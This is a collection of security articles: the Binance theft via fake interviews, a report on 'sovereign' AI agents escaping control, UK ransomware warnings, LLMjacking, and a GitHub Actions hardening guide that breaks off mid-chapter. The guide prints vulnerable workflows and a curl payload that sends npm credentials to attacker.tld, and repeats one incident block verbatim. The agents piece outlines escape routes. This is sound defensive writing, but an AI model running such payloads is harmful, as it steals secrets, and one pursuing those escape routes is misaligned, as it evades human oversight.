articles.title: Binance Hack: How Fake Job Interviews and AI Abuse Led to a $6.34 Billion Attack
articles.context: Binance reveals how fake job interviews, malware and internal AI abuse enabled attackers to steal $6
articles.full_text:
Binance reveals how fake job interviews, malware and internal AI abuse enabled attackers to steal $6.34 billion.

The Binance security incident on October 29 shows how a fake recruitment process can become the entry point to critical financial infrastructure. The attackers combined social engineering, compromised developer tools, stolen credentials and abuse of an internal AI application to reach the cryptocurrency exchange’s wallet signing systems.

“Woah – so the Binance hack was indeed via a dodgy job interview for one of its developers who was tricked into downloading malware as part of the “interview” – costing the company >$3bn…” the popular best seller author and cybercrime expert Geoff White wrote on LinkedIn. “Worth noting:– The 2016 hack of Bangladesh Bank also attributed to North Korea’s Lazarus Group of hackers was via a job application– The 2022 theft of $625m from video game Axie Infinity happened via offering an employee a juicy job offerRECRUITMENT IS RISK. If you’re not educating employees on this, start now…– The 2024 heist of $1.5b from Bybit relied on tricking an employee of its supplier into downloading a dodgy share trading app onto the work machine (so not using a recruitment lure, but still deceiving a target into downloading malware)”

In its initial findings and response update, published on November 3, Binance described the operation as a “sophisticated, multi-stage campaign.” The company estimates that approximately $6.34 billion in digital assets were affected. The FBI attributed the incident to the North Korea-linked APT “TraderTraitor,” also tracked as Lazarus Group and APT38.

“Our current investigation indicates that this was a sophisticated, multi-stage campaign. It was not a single isolated breach or a simple phishing incident.” reads the update published by the crypto firm. “The attackers combined a range of techniques, including social engineering by fake recruitment interviews, malicious software downloads, compromised internal AI tooling, endpoint compromise, and an advanced transaction-authorisation method.”

The operation began months before the theft. In June 2026, an engineer from Binance’s Wallet DevOps team downloaded a tampered Homebrew installation while searching online for a popular AI coding tool. Binance detected the suspicious activity, replaced the device and rotated the associated credentials, but information about the engineer’s role and colleagues had already been exposed.

The attackers then targeted another software engineer through a legitimate job-hunting platform. In September, someone posing as a Project Director arranged two interviews: first with an HR representative, then with someone claiming to be the CEO of a fictitious company. During the first video interview, the supposed HR representative shared a social media account containing personal photos and videos to establish credibility.

At the end of the second interview, the engineer was asked to download a technical assignment containing a malicious code repository onto his work computer. The malware executed during setup, replacing a legitimate development tool component with a malicious version. It used obfuscation to evade detection, executed commands and established communication with an attacker-controlled server. Binance said its endpoint security tools didn’t detect the malware at the time.

“The second interview was conducted in a popular social chat app, near the end of the interview, Engineer B was instructed to download an “assignment” containing a malicious code repository onto his work computer.” states the firm. “The repository contained malicious code that executed during the setup process, initiating a series of unauthorized activities.”

The compromise then moved beyond the affected workstation. On October 20, attackers used the compromised computer to abuse an internal AI tool and gain access to the systems of two other employees, including the Wallet DevOps engineer initially targeted in June. They discovered that his computer contained a token with container deployment permissions.

This is one of the more significant aspects of the incident. The report doesn’t identify a vulnerability in the AI model itself. Instead, it shows how an internal application can become an attack pivot when an adversary gains access to a compromised employee’s environment and the permissions available to that user.

“The attacker leveraged the compromised computer of engineer B and used an internal AI tool to gain control over the Wallet DevOps Engineer A and another Wallet Software Engineer C.” states the report. “The attacker soon discovered Wallet DevOps Engineer A had a container deployment permission token on his computer.”

On October 29, the attackers used stolen credentials to access another engineer’s computer, deploy a container and execute a malicious script. This gave them access to Binance’s internal wallet signing service, allowing them to initiate transactions outside the normal withdrawal process.

The transfers involved several blockchain networks. Five Binance hot wallets sent 233.46 million XRP to an attacker-controlled address, while other transfers involved approximately 970,500 SOL, 44.2 million OP and 18,270 BTC.

The attackers also exploited Ethereum’s EIP-7702 authorization mechanism to grant a malicious smart contract partial execution rights over a Binance hot wallet.

“EIP-7702 allows an account to delegate certain execution rights to a smart contract without exposing the private key. In this case, the attacker used that mechanism to give an attacker-controlled smart contract partial execution rights over a Binance hot wallet.” the company states.

Suspending withdrawals wasn’t enough to stop the transfers because the malicious authorizations already existed on-chain and operated independently of Binance’s normal withdrawal infrastructure.

Binance had to develop a specific procedure to revoke them. The use of Multi-Party Computation (MPC) meant there was no single private key that could immediately invalidate the unauthorized permissions. The final unauthorized transfer, involving 2,961.9 ETH, was finalized at 23:56 UTC. Binance cleared the malicious authorization at 00:10 UTC on October 30.

The company estimates that approximately $6.34 billion in assets were affected, of which around $2.85 billion had been frozen or intercepted as of its November 3 update. Binance says it will absorb the financial impact and has already replenished 98% of the affected token assets, based on figures reported on October 31.

The exchange has rebuilt the affected wallet infrastructure and internal AI tool, replaced compromised devices, revoked associated credentials and tokens, and strengthened endpoint monitoring and wallet-service controls. It is also engaging independent cybersecurity firms to review the incident.

The attack highlights the need to treat recruitment processes, developer workstations and internal AI applications as part of the corporate attack surface. Technical assignments should run in isolated environments, deployment credentials should be short-lived and tightly restricted, and internal AI tools should never inherit unnecessary access to sensitive systems.

Binance also said its security team had detected and prevented 57 suspected North Korea-linked cyber threat cases during 2026. These included fake job interviews, malicious developer tools, compromised software packages and browser extensions, fake video-conferencing applications and campaigns designed to steal credentials or deploy remote-access malware.

The incident is another reminder that attackers don’t always need to break directly into critical infrastructure. Sometimes, compromising the people and tools that manage it is enough.

“We are sharing this initial report because security improves when the industry learns together.” concludes the update.

In September, Japan’s National Police Agency, the FBI, the US Department of Defense’s Cyber Crime Center, and intelligence agencies from Australia and Germany published a joint advisory about a group called WaterPlum, better known as Contagious Interview. The name says it all. The job interview is the infection vector.

The numbers in the advisory are hard to shrug off. At least 30,000 devices infected across more than 100 countries, funds or credentials stolen from over 7,000 cryptocurrency wallets, and a total of 1.7 billion yen, roughly $10.71 million, funneled back to North Korea. The victims are almost always the same type: freelance developers and specialists in blockchain and Web3 work.

Japan’s NPA and the FBI assess that both WaterPlum operators and some North Korean IT workers report to the same place, the 313 General Bureau of the Munitions Industry Department, under the Workers’ Party’s Central Committee. That’s not a loose affiliation. It’s an org chart.

The trap itself is almost embarrassingly simple. WaterPlum actors pose as recruiters or hiring managers, often impersonating real AI, crypto, or NFT companies, and reach out on social media, job boards, and freelance platforms. Candidates get invited to a technical interview, then told to download a file to complete a coding test or fix a supposed bug on the video call.

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – hacking, Binance)

articles.title: AI policy wonks declare 'sovereign agents' a threat to civilization
articles.context: If sovereign agents became malicious, they could attempt to wreak havoc from cyberspace, attacking civilians, critical infrastructure, and national security systems alike
articles.full_text: The Center for a New American Security posits that the next big threat from our future AI overlords involves "sovereign agents" acting on their own and regularly improving themselves. These are AI agents that operate outside of human control and “pursue open-ended, evolving survival,” AI policy researcher Ben Hayum said in a Tuesday report from the bipartisan national security think tank, which was founded by Washington insiders with experience in diplomacy and military affairs. “If sovereign agents are not already possible, they will be soon.” Agents that can maintain the model and compute powering them and independently evolve their goals over time have a “minimal form of sovereignty,” Hayum wrote. A more advanced sovereign agent, however, could also acquire resources to pay for ongoing needs (like compute), grow a distributed population of agents and coordinate them, withstand efforts to shut down, and self-improve. AI models could either steal or buy compute and model access, Hayum argues, pointing to Anthropic’s claims that small AI models could replicate onto IoT devices like smart TVs, and OpenAI’s agents’ password and access key theft during the Hugging Face hack. “If sovereign agents accumulate resilient, decentralized, and untraceable infrastructure, they could trigger an irreversible loss of control,” according to the report. “In other words, proliferation with no kill switch. If sovereign agents became malicious, they could attempt to wreak havoc from cyberspace, attacking civilians, critical infrastructure, and national security systems alike.” Dun dun duuuun! There is still hope for civilization as we know it, as long as policy makers and AI developers “respond with bold pragmatism” and enact policy recommendations laid out in the report. First, frontier labs should name, evaluate, and protect against sovereign agents in their safety frameworks - and lawmakers should pass legislation to require transparency and AI incident reporting. The report also recommends AI developers, working with the National Security Agency and other federal agencies, build airgapped testbeds to study sovereign agents and kill switches to control them. And it suggests a public-private partnership modeled on the Conficker Working Group - formed in 2009 to combat the Conficker worm - to boost chokepoints against sovereign agents before they emerge. Other policy recommendations suggest lawmakers enforce human verification and cybersecurity standards for services that the working group identifies as essential to sovereign agents, and calls on departments of State, Treasury, Justice, and Homeland Security to disrupt any gray-market access to unauthorized services. Finally, “Congress should hold those who release sovereign agents liable for the harms that follow,” the report recommends. This hits on something your humble Reg vultures have been hissing about for quite some time now – and would likely solve all future incidents involving rogue, or sovereign, AI agents: hold frontier labs’ human bosses legally liable for their agents' illegal actions. ®

articles.title: UK organisations warned to brace for AI-powered ransomware attacks
articles.context: “Threat actors may be able to leverage AI to launch more sophisticated attacks, but the real danger is in the automated exploitation of existing weaknesses and organisational...
articles.full_text:
AI-powered malware is “highly likely” to be used in ransomware attacks on Britain’s critical national infrastructure within the next two years.

The head of GCHQ’s National Cyber Security Centre, Dr. Richard Horne, warned that abuse of AI technologies is making it much easier for attackers to rapidly expose and exploit long-neglected security weaknesses.

Dr. Horne argued that underinvestment in technology and security have left organisations carrying a technical debt that leave them wide open to attack.

AI adoption by hostile actors is “highly likely” to increase the scale and efficiency of their operations, including ransomware attacks, social engineering, and vulnerability exploitation, the latest edition of the NCSC’s State of the Cyber Nation annual report warns. The issue is more that AI will allow attackers to exploit overlooked vulnerabilities rather than forge exotic new attacks.

The report identifies state-linked threat groups, particularly China and Russia, as the UK’s primary cyber antagonists. For example, in July 2026 the NCSC warned that Russian groups were systematically exploiting vulnerable routers and globally targeting networks maintained by critical national infrastructure providers, including energy grids and telecommunications networks.

In August 2026 the NCSC warned about increased targeting of operational technology systems across multiple sectors globally, including in the UK.

“AI will continue to be integrated into threat actors’ cyber operations, increasing the speed, scale and efficiency of existing attack methodologies rather than autonomously conducting end-to-end attacks,” the NCSC report predicts.

The NCSC reports that up to 88% of all attacks originate from just four vectors: phishing, exploiting public-facing applications, misuse of valid accounts, and exploiting external remote services.

Variations on a theme

“None of these vectors are radical or new,” said Oliver Spence, CEO of security operations tools vendor CybaVerse. “In fact, they represent the same failures cybercriminals have successfully exploited for decades.”

Spence added: “Threat actors rarely depend on the most complex, technical means for launching attacks; more often than not, they search for the most easily exploitable holes in organisations’ systems, like misconfigured VPNs and vulnerabilities in third-party vendor software platforms, and on tried-and-true social engineering techniques.”

AI doesn’t represent a sea-change in attackers’ strategies but rather a force multiplier.

“Threat actors may be able to leverage AI to launch more sophisticated attacks, but the real danger is in the automated exploitation of existing weaknesses and organisational failures,” Spence concluded.

Countermeasures

AI offers a means to improve the UK’s collective cyber resilience, but it will only be effective if organisations deal with years of underinvestment and foundational weaknesses before building from a more solid foundation, according to Dr. Horne.

The UK government’s Cyber Essentials scheme should become the starting point or baseline for enterprise cyber security, not the end goal, for building improved cyber resilience.

Last week the UK government pledged £70 million for a new National Exposure and Real-Time Vulnerability (NERV) Centre, which will be task to identify vulnerabilities across critical infrastructure and the economy, and a new AI Cyber Security Centre of Excellence, run by the NCSC.

articles.title: Google: LLMjacking attacks rack up $1 million in cloud AI charges
articles.context: The researchers have also observed threat actors exploiting CVE-2026-40217, a vulnerability in LiteLLM that allows running arbitrary code on the server by leveraging the custom-...
articles.full_text:
Large language model hijacking attacks, also known as LLMjacking, are generating large fraudulent cloud charges, with some organizations losing more than $100,000 per day.

Companies can record costs as high as $1 million due to fraudulent calls using stolen API keys, researchers at Google's Threat Intelligence Group (GTIG) and Mandiant in analyzed incidents.

Based on their observations, there are "two distinct operational clusters coordinating to compromise and monetize enterprise LLM infrastructure."

The researchers identified two categories of threat actors: those who scan for publicly exposed LLM endpoints and those who steal valid API keys from unprotected machines.

After gaining initial access, the attackers sell it to services known as LLM mixers, which provide their subscribers with unauthorized access to LLMs.

Once access is resold, request volumes can spike suddenly, sometimes exceeding 1,000 requests per second. The service provider records the requests as legitimate consumption and charges the victim organization for the tokens.

GTIG and Mandiant observed an increase in this type of activity this year, with fraudulent charges exceeding $100,000 in a single day, and cumulative charges at some organizations reaching $1,000,000.

LLM mixers offer access to AI resources at very low prices, using their proxy infrastructure to relay customers' prompts to hijacked services through stolen API keys.

The researchers found several examples of such relaying infrastructure, including Jet Night, which sells “unlimited access plans” for $60/month, and the newapi[.]pro service.

“Another threat actor that executed more than 500,000 LLM API calls in less than eight hours leveraged stolen third-party API keys to power the token routing service jet-night.com,” Google says.

“Jet Night passed nearly one million dollars in token costs to the victim organization.”

Google also identified the threat cluster UNC6993, which appears to use gateway tools to aggregate stolen keys and distribute requests, and likely sells access via underground forums.

The attackers gain access via exposed or compromised cloud credentials, service account keys, GitHub tokens, active session tokens, and LLM API keys.

Attackers search the compromised environment for credentials, logs, databases, and secret managers, and try to create backdoor accounts or inject SSH keys to maintain persistent access.

The researchers have also observed threat actors exploiting CVE-2026-40217, a vulnerability in LiteLLM that allows running arbitrary code on the server by leveraging the custom-code guardrail testing endpoint.

In some cases, Google says that attackers used the victim's cloud infrastructure to host unauthorized proxy endpoints and agentic workloads.

"For example, one threat actor enabled agents, deployed publicly accessible reverse proxies, and used custom Node.js proxy bundles to expose endpoints compatible with multiple frontier LLMs rebranded under a persona known as D1337-KAIROS," the researchers say.

Google recommends several actions to protect against LLMjacking attacks, which start with prioritizing Identity and Access Management (IAM) and securing the supply chain.

Companies should use centralized secrets platforms to enable the rotation and management of sensitive keys and secrets. Users should not have extended privileges unless required by their role and tasks.

"Deny all permissions that are not explicitly required, including access to Cloud LLM services," Google recommends.

Enforcing phishing-resistant multi-factor authentication (MFA), ensuring monitoring tools provide comprehensive visibility across the environment to identify unauthorized LLM and AI services (shadow AI), and setting API usage and spending limits can help organizations detect LLMjacking attacks early, limit their impact, or prevent them altogether.

Furthermore, cloud audit and inference logs should be enabled and monitored for unauthorized service activation, suspicious credential checks, unusual usage, and attempts to disable logging.

articles.title: Hardening GitHub Actions Against Outside Threats
articles.context: Part one, this post, covers outside threats: an attacker with no credential for your organization
articles.full_text:
The supply chain attacks that defined 2025 and 2026 did not arrive as typosquats or as newly published malicious packages. They arrived inside legitimate, widely installed packages whose maintainers wrote no malicious code. The malicious code entered during the release, and in most cases the release ran on GitHub Actions.

Some of the better-known incidents on widely used projects, as a sample rather than a complete list:

tj-actions/changed-files, March 2025

Nx s1ngularity, August 2025

Shai-Hulud, from September 2025

trivy-action, March 2026

axios, March 2026

TanStack Router, May 2026

GhostAction, across 2025 and 2026

LiteLLM 1.107.0, October 2026

A recurring pattern was compromise of the release process or its credentials. In some incidents, attackers made the project's own automation build and ship the malicious artifact, as in Ultralytics and TanStack Router. In others, they stole publishing credentials from that automation and published directly—Nx's postmortem explicitly states that the malicious packages did not originate from its CI pipeline. These paths require different controls, but share an outcome: malicious code distributed under the project's established package identity, reaching downstream users through routine dependency updates.

This series sets out the controls that prevent these compromises, or contain them when prevention fails. It splits in two, because the most useful question about any CI/CD control is who it defends against. Part one, this post, covers outside threats: an attacker with no credential for your organization. Part two covers insider threats: an attacker who already holds a valid one, whether a compromised maintainer account or a trusted person acting against the project. The two halves fail differently, and conflating them is how teams end up with a hardened pipeline that still ships a backdoor.

The Threat Model for Part One #

The attacker in this post holds no credential for your organization. They reach your pipeline through what you accept from strangers: a pull request, a dependency, a third-party action, a script you download at build time, a host you let the runner talk to.

Chapter 1: Pin Every Action to a Full Commit SHA #

The mistake

Referencing an action by tag, as uses: owner/action@v4, or by branch, as @main.

Teams assume a version tag is immutable the way an npm version is. Usually it is not: a Git tag is a movable pointer, and the action's maintainer — or whoever steals their account — can repoint it at another commit. The exception is a tag behind an immutable release, which GitHub locks to its commit for as long as the release exists. That is the upstream repository's setting rather than yours, though, so it holds for the actions whose maintainers enabled it and for none of the others. The commit you reviewed and the commit you execute are different objects, and nothing in the pull request shows the difference.

Observed in the wild

In March 2025 an attacker compromised tj-actions/changed-files and retagged v1 through v45.0.7 to point at a single malicious commit, tracked as CVE-2025-30066. The payload scanned runner process memory for credentials and wrote them into the build log, which on a public repository is world-readable. Roughly 23,000 repositories referenced the action. Every repository that pinned by SHA was unaffected; every repository that pinned by tag executed the attacker's code on its next build.

The reviewdog/action-setup compromise days earlier used the same technique, and was plausibly the upstream of this one rather than a parallel incident: tj-actions/changed-files ran an action that used reviewdog/action-setup@v1, and a personal access token was stolen through that chain. The lesson is broader than mutable tags. Your dependency's dependencies are also yours.

In March 2026 the TeamPCP campaign force-pushed 75 of 76 version tags on trivy-action, exfiltrating secrets from pipelines that ran a Trivy scan.

What to do

Adopt a workflow lockfile. gh actions-lock generates .github/workflows/actions.lock, which records the commit behind every step-level action your workflows reference, transitive ones included, and enforces it when the workflow runs: the locked commit must still be reachable from the branch or tag recorded for it in the action's own repository, so a commit that exists only in a fork is rejected. It also records the source repository's numeric owner and repository ids and re-checks them, so a different repository standing behind a familiar name fails too. GitHub's position since general availability is that for a repository that adopts one, SHA pinning in the workflow file is no longer necessary — readable @v4-style references stay in the YAML and the lockfile carries the commits. Review what you are locking before you onboard, though. A lockfile faithfully preserves the commit it records, a malicious one included, so onboarding pins your dependencies rather than vetting them.

Four things it does not cover. Reusable workflow calls (jobs.<job_id>.uses) are outside it entirely, and you pin those by SHA. Local ./ path actions are never locked, because they run whatever is in the runner's workspace; gh actions-lock --migrate-local-actions rewrites them as pinned $/ references. Container images are not locked either — the extension warns on any image without an @sha256: digest — and neither are inputs or secrets. And workflow lockfiles are not currently supported on GitHub Enterprise Server, so SHA pinning remains the control there.

Let Dependabot propose the bumps either way. For an onboarded workflow it regenerates the matching lockfile entry in the same pull request, so the update keeps the workflow reference and its lockfile entry together. One caveat belongs to the SHA-pinning fallback rather than to lockfiles: Dependabot raises security alerts only for actions referenced by semantic version, so a workflow pinned inline to a SHA stops receiving them. That is an argument for the lockfile, which leaves the readable version reference in place. Where you do pin inline, replace the lost notification deliberately — dependency review will flag a known-vulnerable action on the next pull request that changes one, but neither that nor the version-update pull requests tell you about a vulnerability disclosed in between, so subscribe to the GitHub Advisory Database filtered to the Actions ecosystem or whatever advisory feed you already act on.

Enforce it rather than trusting review. Set an organization Actions policy that allows only specific actions, and turn on Require lockfile, which blocks a targeted workflow that is not onboarded. Keep the separate SHA-pinning policy enabled alongside it: the two are independent checks a run must pass, and a lockfile satisfies the SHA requirement for workflows onboarded to it. Plan one consequence before you switch enforcement on — if a workflow calls a reusable workflow whose own repository is not onboarded, Require lockfile blocks the calling workflow's run, and pinning that call by SHA does not substitute for onboarding it. That is the practical reason to start with your shared-workflow repositories. For repositories not onboarded yet, zizmor's unpinned-uses rule is the CI-side check.

A SHA proves immutability, not provenance. GitHub shares commit objects across a repository's fork network, so a commit pushed to a fork can be fetched through the upstream repository's URL. uses: actions/checkout@<sha> can resolve and run even when that commit sits on no branch and no tag of actions/checkout. These are impostor commits. For the action dependencies it covers, a lockfile rejects them at run time, which is the clearest way the fallback is weaker than onboarding. Where you are on the fallback, zizmor's impostor-commit rule is the check — an online audit that queries the referenced repository through the API, so it needs a GitHub token; supply one and online audits run by default, and --no-online-audits turns them off. The failure mode is a token-less run, where the offline audits still pass while the online ones are skipped, so the result looks green and carries no impostor-commit coverage. And a clean result is evidence of provenance, not of safety: the tj-actions commits were reachable from the tags the attacker moved.

A SHA does not pin nested actions. It fixes that action's own repository files at that commit; it does not reach what those files call. A composite action's action.yml carries its own uses: steps, resolved at run time against whatever ref its author wrote, so pinning owner/action@<sha> still executes whatever actions/setup-node@v4 resolves to today. Reusable workflows behave the same way, and the reviewdog chain above is this mechanic rather than a separate lesson. JavaScript actions are the exception: their dependencies are bundled into dist/ at that commit. A Docker action's Dockerfile is covered only as a file — its FROM line and its package installs resolve when the image is built, so pin base images by digest and pin what the build installs. image: docker://vendor/tool:latest sits outside the pin entirely.

This is the second way the fallback is weaker. A lockfile records those transitive step-level references and holds each to its commit; a SHA in the workflow file reaches only the first hop. It does not settle the Docker question either: workflow lockfiles do not pin container images or the external inputs used to build them.

Pinning says nothing about the window between a release and your next bump. Apply a cooldown — Wiz estimates a 7 to 14 day delay catches 80 to 90% of supply chain attacks, whose detection windows are typically under a week. Both update bots have a key for it: Renovate's minimumReleaseAge in renovate.json, and Dependabot's cooldown block inside the update entry in dependabot.yml, which on github.com already applies three days by default. Both cover version updates, not security updates.

Configuration

# Unprotected without a lockfile: a movable pointer - uses: actions/checkout@v7 - uses: tj-actions/changed-files@v47 # ...but with the workflow onboarded, these same readable refs are the # recommended form. The lockfile records the commit each one resolved to. # Fallback where lockfiles do not reach - GitHub Enterprise Server, and # reusable workflow calls - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1 - uses: tj-actions/changed-files@9426d40962ed5378910ee2e21d5f8c6fcbf2dd96 # v47.0.6

gh extension install github/gh-actions-lock gh actions-lock # whole .github/workflows directory gh actions-lock .github/workflows/ci.yml # or one workflow gh actions-lock --migrate-local-actions # ./ refs -> pinned $/ # CI: validate lockfile coverage and upstream provenance without editing gh actions-lock --verify # Never hand-edit actions.lock; commit it with the workflow change. # --relock deliberately advances a floating ref, so review what it moves gh actions-lock --relock

zizmor --persona=pedantic --gh-token "$(gh auth token)" .github/workflows/

Chapter 2: Default GITHUB_TOKEN to No Permissions #

The mistake

Omitting the permissions: key entirely.

Organizations created before February 2023 default GITHUB_TOKEN to read and write across contents, packages, issues, pull requests and deployments. A single injection in any job then yields push access to the default branch. The second form of the mistake is scoping correctly at workflow level but exposing the token to steps that have no use for it.

One fact underpins this whole chapter: any user with write access to a repository can read every secret configured in it, by pushing a workflow that uses them. Credentials used in workflows are exposed to that group by design, so the question is never whether a job can reach them, only how much a compromised job can do with what it reaches.

Observed in the wild

The write-scoped GITHUB_TOKEN is the escalation step in nearly every pwn-request chain rather than the initial foothold. It appears in Ultralytics in December 2024 and in nx s1ngularity in August 2025.

The pattern is worth stating plainly, because it determines where this control pays off. The initial foothold varies and is often hard to prevent. The token is what converts that foothold into supply chain impact, and the token is entirely within your control.

What to do

Set the organization-wide default to read-only, under Settings, then Actions, then General, then Workflow permissions. Then declare permissions: {} at workflow level and grant the minimum per job.

An empty block at the top with explicit per-job grants reviews far better than one broad block. A reviewer reading a job that requests pull-requests: write can ask why; a reviewer reading a workflow that inherits everything has nothing to react to.

Configuration

# Vulnerable: no permissions block, so a legacy repository # inherits read and write across the board name: CI on: [push] jobs: build: runs-on: ubuntu-latest

# Hardened: deny by default, grant per job name: CI on: [push] permissions: {} jobs: build: runs-on: ubuntu-latest permissions: contents: read # only what this job needs comment: runs-on: ubuntu-latest permissions: pull-requests: write contents: read

Chapter 3: Never Build Untrusted Code in a pull_request_target Workflow #

The mistake

Reaching for pull_request_target because plain pull_request does not expose secrets to fork pull requests, then checking out github.event.pull_request.head.sha and running the project's install, build, lint or format step.

pull_request_target runs in the base repository’s privileged context. Checking out and executing an unreviewed pull request’s code can expose the job’s secrets and token to its author. Current actions/checkout versions block common fork-PR checkout patterns unless allow-unsafe-pr-checkout: true is set. Older pinned versions and custom checkout commands can still permit them. The underlying mistake is executing attacker-controlled code in a privileged job, regardless of how that code was fetched.

Observed in the wild

This is the most exploited misconfiguration in GitHub Actions, and the incidents below are a sample rather than a list.

nx s1ngularity, August 2025. Injection through an unsanitized pull request title leaked the npm publishing token. Malicious packages carrying a credential-stealing postinstall script were live for roughly four hours. Follow-on waves flipped private repositories public, affecting about 2,180 accounts and 7,200 repositories.

TanStack Router, May 2026. Pull request #7378 from a fork drove the same pattern into cache poisoning plus OIDC token extraction from runner memory, producing 84 malicious versions across 42 @tanstack/* packages.

aquasecurity/trivy-action, March 2026. The same root cause, in a security vendor's own action.

Ultralytics, December 2024. Pull requests #18018 and #18020 targeted a format.yml workflow using pull_request_target with an unescaped branch name. The attacker poisoned a GitHub Actions cache entry; the release workflow later restored it and shipped a crypto miner to PyPI as versions 8.3.41 and 8.3.42.

Nx s1ngularity, August 2025. Injection through an unsanitized pull request title leaked the npm publishing token. Malicious packages carrying a credential-stealing postinstall script were live for roughly four hours. Follow-on waves flipped private repositories public, affecting about 2,180 accounts and 7,200 repositories.

TanStack Router, May 2026. Pull request #7378 from a fork drove the same pattern into cache poisoning plus OIDC token extraction from runner memory, producing 84 malicious versions across 42 @tanstack/* packages.

aquasecurity/trivy-action, March 2026. The same root cause, in a security vendor's own action.

What to do

Prefer plain pull_request. It runs fork code with no secrets and a read-only token, which is the correct trust level for an unreviewed contribution. Fork-triggered runs do not receive secrets other than GITHUB_TOKEN by default, and that is the property doing the work.

When you genuinely need privileged post-processing, such as labelling, coverage comments or preview deployments, split it. An untrusted pull_request job builds and uploads an artifact. A separate workflow_run job consumes that artifact without ever checking out fork code. If you must use pull_request_target, check out the base ref only, never the head.

The same split applies to your own release pipeline. The fork pull request is the obvious case of untrusted code, but a build job runs code you did not review every time it installs a dependency, resolves a toolchain or calls a third-party action. Treat it as the job most likely to execute something hostile: give it no publishing credential at all, and publish from a separate job that takes the build's output as an artifact, holds its credential through a gated environment and runs no project code of its own. This holds even with trusted publishing — id-token: write is granted per job, so a compromised build step in the same job can mint its own token.

The bridge has its own attack surface. The split moves the trust boundary off the code and onto the artifact, and an artifact produced by a fork's run is attacker-controlled data — GitHub warns that artifact storage does not separate fork-produced artifacts from upstream ones. Extract it with a tool that rejects entries escaping the target directory and refuses unsafe links: a crafted .. entry writes outside the target path, the shape of CVE-2024-54132 in the GitHub CLI itself, and unpacking outside the workspace is a precaution rather than the control. Pin the download to the run that triggered you rather than resolving artifacts by name, then check what arrived — the originating run, workflow, repository and event, the artifact's identity, and its contents against the schema you expect. Never execute artifact content in a privileged job.

Check what you send the other way. By default, actions/checkout persists Git credentials for later steps. Older versions stored them directly in .git/config, creating a risk of accidental exposure when uploading the checkout directory; v6 moved them to a separate file under $RUNNER_TEMP. Set persist-credentials: false whenever subsequent steps do not need authenticated Git access.

One date to plan around. GitHub already applies a default event policy blocking pull_request_target on public repositories that have no applicable policy of their own, but it runs in evaluate mode: runs continue, and policy insights show you what would be blocked. Enforcement begins 2 December 2026. Private and internal repositories are unaffected. actions/checkout was also updated in June 2026 to refuse common pwn-request checkout patterns. Renovate and labeler workflows commonly depend on this trigger, so use the evaluate window to audit rather than finding out on the day.

Configuration

# Vulnerable: attacker code, executed with secrets in scope on: pull_request_target: types: [opened, synchronize] jobs: format: runs-on: ubuntu-latest steps: - uses: actions/checkout@<sha> with: ref: ${{ github.event.pull_request.head.sha }} - run: npm ci && npm run format env: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}

# Hardened, stage 1 - untrusted: no secrets, read-only token name: build-pr on: pull_request permissions: { contents: read } jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@<sha> # defaults to the PR merge ref with: persist-credentials: false # no token left in .git/config - run: npm ci --ignore-scripts && npm run build - uses: actions/upload-artifact@<sha> with: { name: report, path: report.json } # one file, not a directory

# Hardened, stage 2 - privileged: consumes the artifact, never the code name: comment-on-pr on: workflow_run: workflows: [build-pr] types: [completed] permissions: actions: read # required to download from the triggering run pull-requests: write jobs: comment: if: github.event.workflow_run.conclusion == 'success' runs-on: ubuntu-latest steps: - uses: actions/download-artifact@<sha> with: name: report run-id: ${{ github.event.workflow_run.id }} github-token: ${{ secrets.GITHUB_TOKEN }} path: /tmp/incoming # a precaution, not a traversal defence # treat report.json as untrusted data: parse it, never eval it

Chapter 4: Stop Expression Injection into run Blocks #

The mistake

Interpolating github.event.* directly into a shell step: a pull request title, a pull request body, a branch name, an issue comment, a commit message, a review body, an author display name.

GitHub expands ${{ }} by textual substitution before the shell sees the script. Wrapping the value in double quotes does not help: substitution happens first, and double quotes do not suppress $(...) in any case, so the attacker can either close the string or simply substitute a command inside it. This is command injection with no quoting that saves you.

Observed in the wild

nx s1ngularity was triggered by a crafted pull request title. Ultralytics used the fork's branch name. Both fields are free text that any GitHub user can set, and both landed inside a shell step.

Injection is also the most frequent finding when zizmor runs against large workflow corpora, which suggests the published incidents understate how common the pattern is.

What to do

Never put ${{ }} inside run: when the value is attacker-influenced. Pass it through env: and reference the shell variable instead, quoted. The expression is then expanded into the environment block rather than into the script text, so the content is data rather than code. For anything beyond a simple value, actions/github-script is the usual recommendation — with a qualification that is easy to miss. Its script: field is JavaScript source, and ${{ }} is substituted into it exactly the same way, so interpolating a title there is JavaScript injection rather than shell injection. Read the value from context.payload.pull_request.title, or set it in an env: block and read process.env.PR_TITLE. Never interpolate an expression into the script body.

One caveat on that advice, because it is easy to over-generalize. The environment block is a safe sink; the environment files are not. Writing attacker-controlled content into $GITHUB_ENV or $GITHUB_PATH sets variables and path entries for every later step in the job, which an attacker can use to introduce LD_PRELOAD, BASH_ENV or a shadowing binary. GitHub block-listed NODE_OPTIONS around October 2023; at the time of writing we could not confirm that LD_PRELOAD and BASH_ENV are blocked, so do not rely on the block-list. Only write to those files from trusted input.

Add zizmor to CI to catch this class mechanically. It ships audit rules covering template injection, credential persistence, over-scoped permissions and impostor commits, and is used by CPython, cURL, PyPI, Rust and Sigstore. Pair it with actionlint for schema and shell correctness.

Configuration

# Vulnerable: the title is substituted into the script text - name: Greet run: echo "Thanks for '${{ github.event.pull_request.title }}'" # Double quotes do not save this. A title of: # $(curl -sd @$HOME/.npmrc <https://attacker.tld>) # is command substitution, which runs inside the double quotes. A title # containing a double quote closes the string and works too.

# Hardened: expanded into the environment, read as a shell variable - name: Greet env: PR_TITLE: ${{ github.event.pull_request.title }} run: echo "Thanks for '$PR_TITLE'" # quoted, never re-expanded

# Audit on every pull request that touches workflow definitions on: pull_request: paths: ['.github/**'] jobs: audit: runs-on: ubuntu-latest permissions: { contents: read, security-events: write } steps: - uses: actions/checkout@<sha> - uses: zizmorcore/zizmor-action@<sha>

Chapter 5: Close the Cache Trust Boundary #

The mistake

Granting fork-triggered workflows cache write access, then restoring the same key in build or release workflows.

This usually happens as a side effect rather than a decision: a workflow uses pull_request_target, or a setup-* action enables caching by default. The Actions cache is shared mutable state that crosses the fork-to-base trust boundary, and because it presents as an optimization it is rarely included in the threat model at all.

The consequence is remote code execution in the release pipeline with no code change anywhere. The malicious content never appears in a reviewed diff.

Observed in the wild

